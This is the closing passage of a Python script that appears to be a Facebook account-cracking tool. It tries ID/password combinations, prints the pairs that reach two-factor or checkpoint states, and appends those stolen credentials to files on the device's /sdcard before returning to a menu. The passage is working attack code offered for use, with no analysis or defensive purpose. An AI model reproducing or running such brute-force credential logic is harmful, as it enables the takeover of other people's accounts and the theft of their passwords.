                        print(f'\r{xp}{W}-{G}<[{Y}FAYSAL-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')

                    open('/sdcard/MR Faysal-CEO/FILE/FAYSAL-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<[{W}FAYSAL-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                        
                    open('/sdcard/MR Faysal-CEO/FILE/FAYSAL-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

#----------------\<-LAST-CALL->/----------------#
__CLEAR__()
__TEMOJO__().__MENU__()
#----------------\<-END-CALL->/----------------#
